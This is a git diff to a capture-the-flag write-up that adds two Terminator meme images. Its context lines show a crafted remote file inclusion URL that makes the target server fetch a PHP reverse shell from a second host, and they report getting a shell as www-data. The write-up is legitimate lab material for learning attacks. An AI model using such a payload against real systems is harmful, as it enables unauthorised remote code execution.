@@ -153,7 +153,11 @@ Our crafted payload should look like this, except the target IP and whatever you
 ```bash
 http://10.10.33.12/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.10.184.75:8000/monkey.php
 ```
-And we down have a reverse shell as www-data! Upgrade your shell as shown in the screen shot:
+And we down have a reverse shell as www-data! 
+
+![T 1000](https://tse3.mm.bing.net/th/id/OIP.XX9uuavMwJtNq98TwAlNYQHaEL?rs=1&pid=ImgDetMain)
+
+Upgrade your shell as shown in the screen shot:
 
 ![shell](https://github.com/user-attachments/assets/c75151c8-6f82-47a1-bf9b-9635d0615000)
 
@@ -203,3 +207,4 @@ This process is demonstarted in the screen shot below:
 
 I hope you enjoyed this CTF, hasta la vista baby!
 
+![hasta la vista](https://tse1.mm.bing.net/th/id/OIP.CMVHwqtbstVqSD2iJEUIqAHaDJ?rs=1&pid=ImgDetMain)
